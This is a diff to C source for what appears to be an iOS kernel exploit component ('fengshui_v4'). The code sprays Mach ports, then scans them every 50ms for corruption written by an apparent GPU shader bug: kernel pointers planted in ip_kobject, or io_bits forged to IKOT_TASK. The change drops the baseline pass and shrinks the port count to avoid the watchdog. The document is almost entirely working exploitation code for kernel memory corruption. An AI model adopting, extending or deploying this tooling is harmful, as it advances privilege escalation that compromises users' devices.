@@ -33,7 +33,7 @@
 #include <fcntl.h>
 #include <errno.h>
 
-#define NUM_PORTS     5000
+#define NUM_PORTS     500    /* reduced: v2+v3 already hold 10K ports in system */
 #define SCAN_INTERVAL 0.05   /* 50ms */
 #define IKOT_TASK     2
 
@@ -44,12 +44,9 @@
 #define KERN_HI      0xfffffe00UL
 
 static mach_port_t       g_ports[NUM_PORTS];
-static natural_t         g_base_kotype[NUM_PORTS];
-static mach_vm_address_t g_base_kobject[NUM_PORTS];
 static int               g_count   = 0;
 static int               g_found   = 0;
 static int               g_tick    = 0;
-static int               g_reports = 0;
 
 static void dcim_write(const char *name, const char *buf, int len) {
     char path[128];
@@ -77,11 +74,8 @@ static void report_corruption(int idx, kern_return_t kr,
 
     n += snprintf(buf+n, sizeof(buf)-n,
         "=== CONTROLLED_WRITE_DETECTED (port %d) ===\n"
-        "baseline kotype=%u kobject=0x%016llx\n"
-        "new      kotype=%u kobject=0x%016llx\n"
-        "kr=%d\n",
+        "kotype=%u kobject=0x%016llx kr=%d\n",
         idx,
-        g_base_kotype[idx], (unsigned long long)g_base_kobject[idx],
         new_kotype, (unsigned long long)new_kobject,
         kr);
 
@@ -137,17 +131,15 @@ static void scan_ports(void) {
         kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                               &kotype, &kobject);
         /*
-         * Targeted detection — avoids false triggers on fresh ports:
-         *   Trigger A: kobject is a kernel pointer (shader wrote kernel_base into ip_kobject)
-         *   Trigger B: kotype changed to IKOT_TASK=2 (shader wrote 0x80000002 into io_bits)
-         *
-         * Fresh ports: kr=KERN_SUCCESS, kotype=0, kobject=0 (normal, no kobject set).
-         * We do NOT trigger on mere kr!=SUCCESS to avoid false positives on sandboxed access.
+         * Kernel-pointer detection (no baseline needed):
+         *   Fresh port: kobject=0 (no kobject assigned)
+         *   Corrupted: kobject=0xfffffe004d928000 (kernel_base written by shader)
+         * Trigger only when kobject is clearly a kernel-space address.
+         * Also trigger on kotype==IKOT_TASK (io_bits=0x80000002 written).
          */
-        int kern_ptr    = (kr == KERN_SUCCESS && kobject > 0xfffffe0000000000ULL);
-        int ikot_changed = (kr == KERN_SUCCESS && kotype == IKOT_TASK
-                            && kotype != g_base_kotype[i]);
-        if (kern_ptr || ikot_changed) {
+        int kern_ptr  = (kobject > 0xfffffe0000000000ULL);
+        int ikot_task = (kr == KERN_SUCCESS && kotype == IKOT_TASK);
+        if (kern_ptr || ikot_task) {
             report_corruption(i, kr, kotype, kobject);
             return;
         }
@@ -164,15 +156,13 @@ extern void *kCFRunLoopDefaultMode;
 extern double CFAbsoluteTimeGetCurrent(void);
 extern void CFRunLoopRun(void);
 
-static int g_baseline_done = 0;  /* set after mach_port_kobject baseline pass */
-
 static void timer_cb(CFRunLoopTimerRef t, void *info) {
     g_tick++;
 
     if (g_tick == 1) {
-        /* Tick 1: ONLY allocate ports (fast — matches v3 timing, avoids 0x8BADF00D watchdog).
-         * NO mach_port_kobject calls here — that's done on tick 2.
-         * 5000 x (mach_port_allocate + mach_port_insert_right) ≈ 300ms = safe.
+        /* Tick 1: allocate 500 ports (fast — no baseline scan needed).
+         * 500 × (allocate + insert_right) ≈ 5ms. Well within watchdog.
+         * Detection is kernel-pointer-based (no baseline comparison needed).
          */
         mach_port_t task = mach_task_self();
         for (int i = 0; i < NUM_PORTS; i++) {
@@ -187,29 +177,12 @@ static void timer_cb(CFRunLoopTimerRef t, void *info) {
         }
         char status[128];
         int sn = snprintf(status, sizeof(status),
-            "PORTS_ALLOCATED ports=%d tick=1\n", g_count);
+            "READY ports=%d tick=1 scanning@50ms\n", g_count);
         dcim_write("fengshui_v4_status", status, sn);
         write(STDERR_FILENO, status, sn);
 
-    } else if (g_tick == 2 && g_count > 0) {
-        /* Tick 2: baseline scan — record kotype+kobject for all ports.
-         * 5000 x mach_port_kobject ≈ 500ms (one tick behind allocation = safe).
-         */
-        mach_port_t task = mach_task_self();
-        for (int i = 0; i < g_count; i++) {
-            g_base_kotype[i]  = 0;
-            g_base_kobject[i] = 0;
-            mach_port_kobject(task, g_ports[i], &g_base_kotype[i], &g_base_kobject[i]);
-        }
-        g_baseline_done = 1;
-        char status[128];
-        int sn = snprintf(status, sizeof(status),
-            "READY ports=%d baseline_done tick=2 scanning@50ms\n", g_count);
-        dcim_write("fengshui_v4_status", status, sn);
-        write(STDERR_FILENO, status, sn);
-
-    } else if (g_baseline_done && g_count > 0) {
-        /* Tick 3+: scan for corruption every 50ms */
+    } else if (g_count > 0) {
+        /* Tick 2+: scan every 50ms for kernel-pointer kobject */
         scan_ports();
 
         /* Alive ping every 10s */
